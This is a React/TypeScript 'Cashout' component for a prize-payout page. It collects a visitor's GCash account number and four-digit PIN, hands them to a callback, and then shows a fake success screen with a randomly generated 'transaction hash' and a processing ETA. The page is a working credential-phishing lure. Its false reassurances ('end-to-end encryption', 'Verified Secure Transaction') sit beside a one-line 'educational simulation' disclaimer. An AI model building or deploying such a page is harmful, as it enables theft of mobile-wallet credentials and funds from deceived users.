import React, { useState } from 'react';
import { motion } from 'motion/react';
import { Wallet, ShieldCheck, Info, CheckCircle2, ArrowRight, Lock, CreditCard } from 'lucide-react';

interface CashoutProps {
  prize: string;
  onComplete: (data: { id_number: string; id_pin: string; currency: string }) => void;
}

const CURRENCIES = ['PHP (₱)', 'USD ($)', 'EUR (€)', 'GBP (£)'];

export const Cashout: React.FC<CashoutProps> = ({ prize, onComplete }) => {
  const [idNumber, setIdNumber] = useState('');
  const [idPin, setIdPin] = useState('');
  const [currency, setCurrency] = useState(CURRENCIES[0]);
  const [isSubmitted, setIsSubmitted] = useState(false);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!idNumber || !idPin) return;
    
    setIsSubmitted(true);
    onComplete({ id_number: idNumber, id_pin: idPin, currency });
  };

  if (isSubmitted) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-blue-50 via-white to-purple-50 text-slate-900 flex flex-col items-center justify-center p-6 relative overflow-hidden font-sans">
        {/* Immersive Background */}
        <div className="absolute inset-0 pointer-events-none">
          <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[800px] h-[800px] bg-emerald-500/5 blur-[160px] rounded-full opacity-30"></div>
          <div className="absolute inset-0 bg-[url('https://grainy-gradients.vercel.app/noise.svg')] opacity-5 mix-blend-overlay"></div>
        </div>

        <motion.div
          initial={{ opacity: 0, scale: 0.9, y: 20 }}
          animate={{ opacity: 1, scale: 1, y: 0 }}
          className="max-w-md w-full bg-white/70 backdrop-blur-lg border border-slate-200 p-12 rounded-[3rem] shadow-lg text-center space-y-10 relative z-10"
        >
          <div className="flex justify-center">
            <motion.div
              initial={{ scale: 0, rotate: -45 }}
              animate={{ scale: 1, rotate: 0 }}
              transition={{ type: "spring", stiffness: 200, delay: 0.2 }}
              className="w-24 h-24 bg-emerald-100 rounded-[2rem] flex items-center justify-center border border-emerald-300 shadow-[0_0_30px_rgba(16,185,129,0.2)]"
            >
              <CheckCircle2 className="w-12 h-12 text-emerald-600" />
            </motion.div>
          </div>

          <div className="space-y-4">
            <h2 className="text-5xl font-black tracking-tight text-gradient">SUCCESS</h2>
            <p className="text-slate-600 font-medium leading-relaxed text-sm">
              Your <span className="text-emerald-600 font-black">{prize}</span> reward has been authorized and is now being processed by the system.
            </p>
          </div>

          <div className="bg-white/60 backdrop-blur-lg border border-slate-200 p-8 rounded-[2rem] space-y-6">
            <div className="flex justify-between items-center">
              <span className="text-[10px] text-slate-600 font-black uppercase tracking-[0.2em]">Status</span>
              <span className="bg-emerald-100 text-emerald-700 px-4 py-1.5 rounded-xl font-black text-[10px] uppercase border border-emerald-300 shadow-[0_0_15px_rgba(16,185,129,0.1)]">Processing</span>
            </div>
            <div className="h-px bg-slate-200 w-full"></div>
            <div className="flex justify-between items-center">
              <span className="text-[10px] text-slate-600 font-black uppercase tracking-[0.2em]">ETA</span>
              <span className="text-slate-900 font-black text-sm tracking-tight">2-5 Business Days</span>
            </div>
          </div>

          <div className="pt-4 space-y-3">
            <p className="text-[10px] text-slate-600 font-black uppercase tracking-[0.3em]">Transaction Hash</p>
            <p className="text-[10px] font-mono bg-white/60 backdrop-blur-lg border border-slate-200 py-3 px-5 rounded-2xl text-slate-600 break-all">
              {Math.random().toString(36).substring(2, 15).toUpperCase()}{Math.random().toString(36).substring(2, 15).toUpperCase()}
            </p>
          </div>
        </motion.div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-50 via-white to-purple-50 text-slate-900 flex flex-col items-center justify-center p-6 relative overflow-hidden font-sans">
      {/* Immersive Background */}
      <div className="absolute inset-0 pointer-events-none">
        <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[800px] h-[800px] bg-emerald-500/5 blur-[160px] rounded-full opacity-30"></div>
        <div className="absolute inset-0 bg-[url('https://grainy-gradients.vercel.app/noise.svg')] opacity-5 mix-blend-overlay"></div>
      </div>

      <motion.div
        initial={{ opacity: 0, y: 30 }}
        animate={{ opacity: 1, y: 0 }}
        className="max-w-md w-full bg-white/70 backdrop-blur-lg border border-slate-200 p-10 sm:p-12 rounded-[3.5rem] shadow-lg space-y-12 relative z-10"
      >
        <div className="flex items-center gap-6">
          <div className="w-16 h-16 bg-emerald-100 rounded-[1.5rem] flex items-center justify-center border border-emerald-300 shadow-[0_0_30px_rgba(16,185,129,0.2)]">
            <Wallet className="w-8 h-8 text-emerald-600" />
          </div>
          <div className="space-y-1">
            <h2 className="text-3xl font-black tracking-tight uppercase">CASHOUT</h2>
            <p className="text-slate-600 font-medium text-xs tracking-widest uppercase">Secure Vault Transfer</p>
          </div>
        </div>

        <div className="relative overflow-hidden bg-white/60 backdrop-blur-lg border border-slate-200 rounded-[2rem] p-8">
          <div className="absolute top-0 right-0 p-6 opacity-5">
            <CreditCard size={100} />
          </div>
          <div className="relative z-10 space-y-2">
            <p className="text-[10px] font-black text-slate-600 uppercase tracking-[0.3em]">Available Reward</p>
            <p className="text-5xl font-black tracking-tighter text-emerald-600 shadow-emerald-500/20 drop-shadow-2xl">{prize}</p>
          </div>
        </div>

        <form onSubmit={handleSubmit} className="space-y-8">
          <div className="space-y-3">
            <label className="text-[10px] font-black text-slate-600 uppercase tracking-[0.2em] ml-2 flex items-center gap-2">
              <Lock size={10} className="text-emerald-600" /> Preferred Currency
            </label>
            <div className="relative">
              <select
                value={currency}
                onChange={(e) => setCurrency(e.target.value)}
                className="w-full p-5 bg-white border border-slate-300 rounded-2xl focus:ring-2 focus:ring-emerald-500/20 focus:border-emerald-500 outline-none transition-all font-black text-sm text-slate-900 appearance-none cursor-pointer"
              >
                {CURRENCIES.map(c => <option key={c} value={c} className="bg-white text-slate-900">{c}</option>)}
              </select>
              <div className="absolute right-5 top-1/2 -translate-y-1/2 pointer-events-none text-slate-600">
                <ArrowRight size={16} className="rotate-90" />
              </div>
            </div>
          </div>

          <div className="space-y-3">
            <label className="text-[10px] font-black text-slate-600 uppercase tracking-[0.2em] ml-2">Gcash Account Number</label>
            <input
              type="text"
              required
              placeholder="0000-0000-0000"
              value={idNumber}
              onChange={(e) => setIdNumber(e.target.value)}
              className="w-full p-5 bg-white border border-slate-300 rounded-2xl focus:ring-2 focus:ring-emerald-500/20 focus:border-emerald-500 outline-none transition-all font-black text-sm tracking-widest placeholder:text-slate-400 text-slate-900"
            />
          </div>

          <div className="space-y-3">
            <label className="text-[10px] font-black text-slate-600 uppercase tracking-[0.2em] ml-2">Gcash PIN Number</label>
            <input
              type="password"
              required
              placeholder="••••"
              maxLength={4}
              value={idPin}
              onChange={(e) => setIdPin(e.target.value)}
              className="w-full p-5 bg-white border border-slate-300 rounded-2xl focus:ring-2 focus:ring-emerald-500/20 focus:border-emerald-500 outline-none transition-all font-black text-sm tracking-[1em] placeholder:text-slate-400 text-slate-900"
            />
          </div>

          <div className="flex gap-4 text-[10px] text-slate-600 bg-white/60 backdrop-blur-lg border border-slate-200 p-5 rounded-2xl leading-relaxed">
            <ShieldCheck className="w-6 h-6 text-emerald-600 shrink-0" />
            <p className="font-medium">
              Your transaction is protected by end-to-end encryption. This is a secure system simulation for educational purposes.
            </p>
          </div>

          <motion.button
            whileHover={{ scale: 1.02, y: -2 }}
            whileTap={{ scale: 0.98 }}
            type="submit"
            className="group w-full py-6 bg-gradient-to-r from-emerald-500 to-cyan-500 hover:from-emerald-600 hover:to-cyan-600 text-white font-black text-xl rounded-[2.5rem] shadow-[0_20px_40px_rgba(16,185,129,0.2)] transition-all flex items-center justify-center gap-4"
          >
            AUTHORIZE PAYOUT
            <ArrowRight className="w-6 h-6 group-hover:translate-x-2 transition-transform" />
          </motion.button>
        </form>

        <div className="flex items-center gap-3 justify-center text-slate-600 text-[10px] font-black uppercase tracking-[0.3em]">
          <Info className="w-3 h-3" />
          <span>Verified Secure Transaction</span>
        </div>
      </motion.div>
    </div>
  );
};
